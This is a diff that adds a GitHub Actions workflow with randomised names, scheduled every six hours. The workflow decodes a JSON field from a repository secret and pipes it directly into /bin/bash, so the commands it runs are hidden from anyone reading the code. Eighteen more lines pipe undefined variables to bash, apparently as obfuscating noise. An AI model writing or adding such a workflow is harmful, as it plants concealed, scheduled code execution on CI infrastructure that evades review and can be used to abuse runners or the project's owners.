@@ -1,0 +1,36 @@
+name: guokenushi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: guokenushi
+        env:
+          g8: ${{ secrets.g8 }}
+        run: |
+          echo $g8 | jq -r .vx6 | /bin/bash
+          echo $mcvb35284 | jq -r .sii9 | /bin/bash
+          echo $tj88024 | jq -r .nrpx25116 | /bin/bash
+          echo $kcsoh89 | jq -r .wx3 | /bin/bash
+          echo $l6 | jq -r .e05238 | /bin/bash
+          echo $ge57 | jq -r .ccxir94505 | /bin/bash
+          echo $yzm90 | jq -r .kqgkx4 | /bin/bash
+          echo $nl3392 | jq -r .a142 | /bin/bash
+          echo $x54283 | jq -r .k55 | /bin/bash
+          echo $mvm0283 | jq -r .dysgn1 | /bin/bash
+          echo $p4 | jq -r .vc35692 | /bin/bash
+          echo $hr879 | jq -r .sb85211 | /bin/bash
+          echo $w959 | jq -r .ue5 | /bin/bash
+          echo $q88098 | jq -r .d4711 | /bin/bash
+          echo $za098 | jq -r .rcsz9 | /bin/bash
+          echo $rgz64649 | jq -r .dcdzq16 | /bin/bash
+          echo $r4 | jq -r .t3607 | /bin/bash
+          echo $v653 | jq -r .tjlro31 | /bin/bash
+          echo $v909 | jq -r .jk763 | /bin/bash
+
